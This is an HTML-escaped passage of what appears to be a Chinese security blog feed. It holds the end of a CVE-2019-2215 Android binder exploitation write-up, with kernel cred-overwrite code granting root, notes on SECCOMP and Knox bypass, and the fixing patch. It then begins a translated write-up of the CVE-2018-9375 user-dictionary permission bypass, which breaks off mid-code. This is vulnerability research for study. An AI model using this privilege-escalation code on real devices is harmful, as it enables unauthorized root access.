+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">kWriteDword&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">uint8_t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">m_cred&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">offsetof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">cred&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">egid&lt;/span>&lt;span class="p">)),&lt;/span> &lt;span class="n">GLOBAL_ROOT_GID&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">kWriteDword&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">uint8_t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">m_cred&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">offsetof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">cred&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">fsuid&lt;/span>&lt;span class="p">)),&lt;/span> &lt;span class="n">GLOBAL_ROOT_UID&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">kWriteDword&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">uint8_t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">m_cred&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">offsetof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">cred&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">fsgid&lt;/span>&lt;span class="p">)),&lt;/span> &lt;span class="n">GLOBAL_ROOT_GID&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">kWriteDword&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">uint8_t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">m_cred&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">offsetof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">cred&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">securebits&lt;/span>&lt;span class="p">)),&lt;/span> &lt;span class="n">SECUREBITS_DEFAULT&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">kWriteQword&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">uint8_t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">m_cred&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">offsetof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">cred&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">cap_inheritable&lt;/span>&lt;span class="p">)),&lt;/span> &lt;span class="n">CAP_EMPTY_SET&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">kWriteQword&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">uint8_t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">m_cred&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">offsetof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">cred&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">cap_permitted&lt;/span>&lt;span class="p">)),&lt;/span> &lt;span class="n">CAP_FULL_SET&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">kWriteQword&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">uint8_t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">m_cred&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">offsetof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">cred&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">cap_effective&lt;/span>&lt;span class="p">)),&lt;/span> &lt;span class="n">CAP_FULL_SET&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">kWriteQword&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">uint8_t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">m_cred&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">offsetof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">cred&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">cap_bset&lt;/span>&lt;span class="p">)),&lt;/span> &lt;span class="n">CAP_FULL_SET&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">kWriteQword&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">uint8_t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">m_cred&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">offsetof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">cred&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">cap_ambient&lt;/span>&lt;span class="p">)),&lt;/span> &lt;span class="n">CAP_EMPTY_SET&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>前面已经泄露出了task_struct-&amp;gt;cred的地址，这里就只用将事先准备好的cred结构体写入即可&lt;/p>
+&lt;p>最后执行&lt;code>system(&amp;quot;/bin/sh&amp;quot;);&lt;/code>、&lt;code>execve(&amp;quot;/system/bin/sh&amp;quot;);&lt;/code>即可获得root权限。&lt;/p>
+&lt;p>&lt;img src="https://ykiko.top/img/image-20200629174038205.png"
+loading="lazy"
+alt="image-20200629174038205"
+>&lt;/p>
+&lt;h4 id="disabling-seccomp">Disabling SECCOMP&lt;/h4>
+&lt;p>额外的如果想要将提权程序捆绑到app上的还需要这一步，Android8开始，所有 Android 软件都使用系统调用与 Linux 内核进行通信，SECCOMP过滤器会检测所有的非法调用。SECCOMP过滤器是放在zygote 进程中，而所有的Android应用程序都是该进程fork出来的，按理所以会影响到所有的应用，但是Android安全团队进行了部分筛选，只会阻止某些系统调用。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="k">struct&lt;/span> &lt;span class="n">seccomp&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">mode&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">struct&lt;/span> &lt;span class="n">seccomp_filter&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">filter&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">};&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>想要禁用SECCOMP，直接将mode改为0是导致内核崩溃，需要清除TIF_SECCOMP 标志。&lt;a class="link" href="https://hernan.de/blog/2019/10/15/tailoring-cve-2019-2215-to-achieve-root/" target="_blank" rel="noopener"
+>这篇文章&lt;/a>实现了绕过，感兴趣可以看一看。&lt;/p>
+&lt;p>对于三星的设备，还需要绕过Knox/RKP才行。对于如何绕过，最近有人公开了s8相关的&lt;a class="link" href="https://github.com/chompie1337/s8_2019_2215_poc" target="_blank" rel="noopener"
+>利用代码&lt;/a>，感兴趣可以看看。&lt;/p>
+&lt;h4 id="patch">patch&lt;/h4>
+&lt;p>&lt;a class="link" href="https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/drivers/android/binder.c?h=linux-4.14.y&amp;amp;id=7a3cee43e935b9d526ad07f20bf005ba7e74d05b" target="_blank" rel="noopener"
+>patch&lt;/a>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="n">diff&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="n">git&lt;/span> &lt;span class="n">a&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">drivers&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">android&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">binder&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">c&lt;/span> &lt;span class="n">b&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">drivers&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">android&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">binder&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">c&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">index&lt;/span> &lt;span class="n">a340766b51fe&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mf">.2&lt;/span>&lt;span class="n">ef8bd29e188&lt;/span> &lt;span class="mi">100644&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">---&lt;/span> &lt;span class="n">a&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">drivers&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">android&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">binder&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">c&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">+++&lt;/span> &lt;span class="n">b&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">drivers&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">android&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">binder&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">c&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">@@&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">4302&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">6&lt;/span> &lt;span class="o">+&lt;/span>&lt;span class="mi">4302&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">18&lt;/span> &lt;span class="err">@@&lt;/span> &lt;span class="k">static&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">binder_thread_release&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">binder_proc&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">proc&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">t&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">spin_lock&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">t&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">lock&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">+&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">+&lt;/span> &lt;span class="cm">/*
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm">+ * If this thread used poll, make sure we remove the waitqueue
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm">+ * from any epoll data structures holding it with POLLFREE.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm">+ * waitqueue_active() is safe to use here because we&amp;#39;re holding
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm">+ * the inner lock.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm">+ */&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">+&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kr">thread&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">looper&lt;/span> &lt;span class="o">&amp;amp;&lt;/span> &lt;span class="n">BINDER_LOOPER_STATE_POLL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">+&lt;/span> &lt;span class="n">waitqueue_active&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="kr">thread&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">wait&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">+&lt;/span> &lt;span class="n">wake_up_poll&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="kr">thread&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">wait&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">POLLHUP&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">POLLFREE&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">+&lt;/span> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">+&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">binder_inner_proc_unlock&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kr">thread&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">proc&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">send_reply&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>在binder_thread free之前清理掉thread-&amp;gt;wait即可。&lt;/p>
+&lt;h3 id="总结">总结&lt;/h3>
+&lt;p>去年出的经典的提权漏洞，这个漏洞当做提权入门也还不错，可以学习到一个完整的提权流程和几个常见方法。&lt;/p>
+&lt;p>后续真机测试过程中手上没pixel2 只能在pixel的3.18上测试，得注意先测试再使用网上的exp。然后就是适配的话主要是对于一些偏移的适配，以及不是所有的设备能都直接利用，不同内核版本和不同产商又不一样。&lt;/p>
+&lt;p>提权过程中最主要注意的就是不让内核发生奇奇怪怪的奔溃，每次遇到奔溃，可能就需要想其他的方法去绕过。&lt;/p>
+&lt;p>关于这个漏洞还有很多其他思路可以尝试，比如人造页表镜像攻击之类的方式。&lt;/p>
+&lt;h4 id="参考">参考&lt;/h4>
+&lt;ul>
+&lt;li>&lt;a class="link" href="https://www.52pojie.cn/thread-1083552-1-1.html" target="_blank" rel="noopener"
+>https://www.52pojie.cn/thread-1083552-1-1.html&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://blog.csdn.net/weixin_43901866/article/details/102458212" target="_blank" rel="noopener"
+>https://blog.csdn.net/weixin_43901866/article/details/102458212&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://cloudfuzz.github.io/android-kernel-exploitation/" target="_blank" rel="noopener"
+>https://cloudfuzz.github.io/android-kernel-exploitation/&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://github.com/sharif-dev/AndroidKernelVulnerability" target="_blank" rel="noopener"
+>https://github.com/sharif-dev/AndroidKernelVulnerability&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://hernan.de/blog/2019/10/15/tailoring-cve-2019-2215-to-achieve-root/" target="_blank" rel="noopener"
+>https://hernan.de/blog/2019/10/15/tailoring-cve-2019-2215-to-achieve-root/&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://dayzerosec.com/posts/analyzing-androids-cve-2019-2215-dev-binder-uaf/" target="_blank" rel="noopener"
+>https://dayzerosec.com/posts/analyzing-androids-cve-2019-2215-dev-binder-uaf/&lt;/a>&lt;/li>
+&lt;/ul></description></item><item><title>在Android的个人字典中发现和利用漏洞(CVE-2018-9375)</title><link>https://ykiko.top/p/%E5%9C%A8android%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%AD%97%E5%85%B8%E4%B8%AD%E5%8F%91%E7%8E%B0%E5%92%8C%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9Ecve-2018-9375/</link><pubDate>Sun, 05 Aug 2018 21:16:52 +0800</pubDate><guid>https://ykiko.top/p/%E5%9C%A8android%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%AD%97%E5%85%B8%E4%B8%AD%E5%8F%91%E7%8E%B0%E5%92%8C%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9Ecve-2018-9375/</guid><description>&lt;blockquote>
+&lt;p>翻译的文章 渣渣翻译
+原作者：Daniel Kachakil&lt;/p>
+&lt;/blockquote>
+&lt;p>我正在审计一款Android手机，审计范围是所有已经安装了的应用程序。我的首选方法是，在时间允许的时候，就手动检查尽可能多的代码。我发现了一个巧妙的漏洞，这个漏洞允许我与一个内容提供者交互，而该内容提供者应该在最近的Android版本中受到保护：用户的个人词典，它存储了用户想要保留的非标准单词的拼写。&lt;/p>
+&lt;p>虽然理论上应该只授权给特权用户、授权的输入法编辑器(IMEs) ，以及拼写检查程序访问用户的个人词典，但是有一种方法可以绕过这些限制，允许恶意应用程序更新、删除甚至检索字典内的所有内容。而不需要任何权限或者与用户交互。&lt;/p>
+&lt;p>这个中等风险的漏洞被归类为权限提升，并于2018年6月修复，影响到Android的以下版本：6.0、6.0.1、7.0、7.1.1、7.1.2、8.0和8.1。&lt;/p>
+&lt;h3 id="用户的个人词典">用户的个人词典&lt;/h3>
+&lt;p>Android提供了一个自定义词典，可以手动输入或者自动定制，从用户的输入中学习。这本字典的入口为“设置→ 语言和键盘 → 个人词典” （也可能在“高级“或者不同的选项下）。他可能包含有敏感信息，比如姓名、地址、电话号码、电子邮件、密码、商业品牌、不存常的词汇（可能包括疾病、药品、技术术语等），甚至信用卡号。&lt;/p>
+&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20180805212058.png"
+loading="lazy"
+>&lt;/p>
+&lt;p>用户还可以为每个单词或者句子定义一个快捷方式，因此想要输入的家庭地址的时候，你可以添加一个条目并简单地为其添加一个快捷方式（比如“myhome”）来自动完成填写。&lt;/p>
+&lt;p>&lt;img src="http://my-md-1253484710.coscd.myqcloud.com/20180805212115.png"
+loading="lazy"
+>&lt;/p>
+&lt;p>在内部，这些单词存储在SQLLite数据库中，该数据库只包含有一个名为“words”的表（除了“android_metadata” ），这个表有6列：&lt;/p>
+&lt;ul>
+&lt;li>&lt;code>_id (INTEGER, PRIMARY KEY)&lt;/code>&lt;/li>
+&lt;li>&lt;code>word (TEXT)&lt;/code>&lt;/li>
+&lt;li>&lt;code>frequency (INTEGER)&lt;/code>&lt;/li>
+&lt;li>&lt;code>locale (TEXT)&lt;/code>&lt;/li>
+&lt;li>&lt;code>appid (INTEGER)&lt;/code>&lt;/li>
+&lt;li>&lt;code>shortcut (TEXT)&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;p>我们主要注意“word&amp;quot;这列，正如名称所示，它包含了自定义的单词。然而，同一数据库中所有剩余的列和表也可以访问。&lt;/p>
+&lt;h3 id="漏洞细节">漏洞细节&lt;/h3>
+&lt;p>在较早版本的Android中，对个人字典的读写访问分别受到以下权限的保护：&lt;/p>
+&lt;ul>
+&lt;li>&lt;code>android.permission.READ_USER_DICTIONARY&lt;/code>&lt;/li>
+&lt;li>&lt;code>android.permission.WRITE_USER_DICTIONARY&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;p>对于新版本来说，这已经不再适用了，根据官方文档[1]:&amp;ldquo;从API 23开始，用户字典只能通过IME和拼写检查器访问” ，以前的权限已经被内部检查所取代，因此理论上，只有特权帐户(比如 &lt;code>root&lt;/code> 和 &lt;code>system&lt;/code>), 启用的IMEs和拼写检查器可以访问个人字典内容提供者  (&lt;code>content://user_dictionary/words&lt;/code>)。&lt;/p>
+&lt;p>我们可以检查AOSP代码库，查看一个变更[2]中引入了一个新的名为&lt;code>canCallerAccessUserDictionary&lt;/code> 的私有函数，并从 &lt;code>UserDictionary&lt;/code> 内容提供者中的所有标准查询、插入、更新和删除函数中调用该函数，以防止对这些函数的未经授权的调用。&lt;/p>
+&lt;p>虽然更改似乎对查询和插入函数都有效，但是在更新和删除过程中，授权检查发生滞后引入了安全漏洞，允许任何应用程序通过公开的内容提供者成功地调用受影响的函数，从而绕过错误的授权检查。&lt;/p>
+&lt;p>在下面的 &lt;code>UserDictionaryProvider&lt;/code>类[3]的代码中，注意高亮（标注在注释）的片段，查看在数据库已经被修改之后如何执行授权检查：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;span class="lnt">41
+&lt;/span>&lt;span class="lnt">42
+&lt;/span>&lt;span class="lnt">43
+&lt;/span>&lt;span class="lnt">44
+&lt;/span>&lt;span class="lnt">45
+&lt;/span>&lt;span class="lnt">46
+&lt;/span>&lt;span class="lnt">47
+&lt;/span>&lt;span class="lnt">48
+&lt;/span>&lt;span class="lnt">49
+&lt;/span>&lt;span class="lnt">50
+&lt;/span>&lt;span class="lnt">51
+&lt;/span>&lt;span class="lnt">52
+&lt;/span>&lt;span class="lnt">53
+&lt;/span>&lt;span class="lnt">54
+&lt;/span>&lt;span class="lnt">55
+&lt;/span>&lt;span class="lnt">56
+&lt;/span>&lt;span class="lnt">57
+&lt;/span>&lt;span class="lnt">58
+&lt;/span>&lt;span class="lnt">59
+&lt;/span>&lt;span class="lnt">60
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="nd">@Override&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">public&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="nf">delete&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">Uri&lt;/span> &lt;span class="n">uri&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">String&lt;/span> &lt;span class="n">where&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">String&lt;/span>&lt;span class="o">[]&lt;/span> &lt;span class="n">whereArgs&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">SQLiteDatabase&lt;/span> &lt;span class="n">db&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">mOpenHelper&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getWritableDatabase&lt;/span>&lt;span class="o">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">count&lt;/span>&lt;span class="o">;&lt;/span>
